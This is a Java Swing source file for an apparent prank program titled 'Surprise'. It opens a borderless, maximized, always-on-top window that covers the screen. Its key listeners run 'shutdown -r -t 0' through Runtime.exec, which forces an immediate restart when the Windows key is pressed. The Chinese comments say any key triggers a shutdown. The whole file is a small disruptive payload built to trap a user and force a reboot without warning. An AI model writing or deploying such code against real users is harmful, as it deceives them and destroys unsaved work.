import javax.swing.*;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.IOException;

/**
 * 全屏外框
 * 带有键盘触发器，按任意键自动关机
 */
public class BlueFrame extends JFrame implements KeyListener {
    public BlueFrame () {
        super("Surprise");

        this.addKeyListener(this);

        this.setUndecorated(true); //不显示边框
        this.setExtendedState(JFrame.MAXIMIZED_BOTH); //最大化
        this.setAlwaysOnTop(!this.isAlwaysOnTop()); //显示在最上层
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); //点X关闭
    }

    public void open() {
        this.setVisible(true);
    }

    @Override
    public void keyTyped(KeyEvent e) {
        if (e.getKeyCode() == KeyEvent.VK_WINDOWS) {
            try {
                Runtime.getRuntime().exec("shutdown -r -t 0");
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    @Override
    public void keyPressed(KeyEvent e) {
        if (e.getKeyCode() == KeyEvent.VK_WINDOWS) {
            try {
                Runtime.getRuntime().exec("shutdown -r -t 0");
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    @Override
    public void keyReleased(KeyEvent e) {
        if (e.getKeyCode() == KeyEvent.VK_WINDOWS) {
            try {
                Runtime.getRuntime().exec("shutdown -r -t 0");
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}